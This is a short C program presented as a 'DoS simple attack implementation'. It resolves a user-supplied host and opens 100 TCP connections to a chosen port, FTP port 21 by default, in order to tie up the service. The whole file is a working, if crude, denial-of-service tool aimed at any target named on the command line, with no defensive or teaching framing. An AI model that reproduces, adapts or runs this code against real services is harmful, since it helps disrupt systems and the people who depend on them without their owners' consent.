/*
 * DoS simple attack implementation by Giovani Ferreira
 */

#include<stdio.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<stdlib.h>

#define DEFAULT_PORT 21                             /* Default port for attack - Setted to 21 = FTP */
#define CONNECTIONS 100                             /* Number of connections to open with the service */

#define false 0                                     /* To work easily with boolean type */
#define true !false

_Bool is_valid_ip(char *ip);                        /* Checks if a given string is a valid IP */
void display_help(char *msg, _Bool with_error);     /* Display a help message and ends the program with or without error */

int main(int argc, char *argv[])
{
    int sock = 0, connection = 0;
    int port = DEFAULT_PORT;                        /* Service port */
    struct sockaddr_in target;
    char* target_host;                              /* The domain/ip to perform the attack */

    if(argc < 2){                                   /* Check if the url was given */
        display_help("You must pass the domain/ip for dos", true);
    }
    
    target_host = argv[1];                          /* Setting the target host from command line input */

    if (!is_valid_ip(target_host)){
        struct hostent *host;
        host = gethostbyname(target_host);          /* Getting the IP addres of the target domain */           
        target_host = inet_ntoa(*((struct in_addr *)host->h_addr));
    } 


    if(argv[2] != NULL){                            /* Checking if the user tell the port of the service */
        if(atoi(argv[2]))                           /* Checking if the passed port is an integer */
            port = atoi(argv[2]);
        else{
            printf("The port must be an integer\nAborting...\n");
            exit(2);
        }
    }

    /* Oppening connections in service */
    for(int i = 0; i < CONNECTIONS; i++){
        sock = socket(AF_INET, SOCK_STREAM, 0);
       
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(target_host);

        connection = connect(sock, (struct sockaddr *)&target, sizeof(target));

        if (connection == 0)
            printf("Connection number %d oppened\n", i + 1);
        else
            printf("Connection number %d failed\n", i + 1);
    }

    return 0;
}

_Bool is_valid_ip(char *ip)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));

    return result != 0;
}

void display_help(char *msg, _Bool with_error)
{
    printf("%s\n", msg);

    exit(with_error);
}
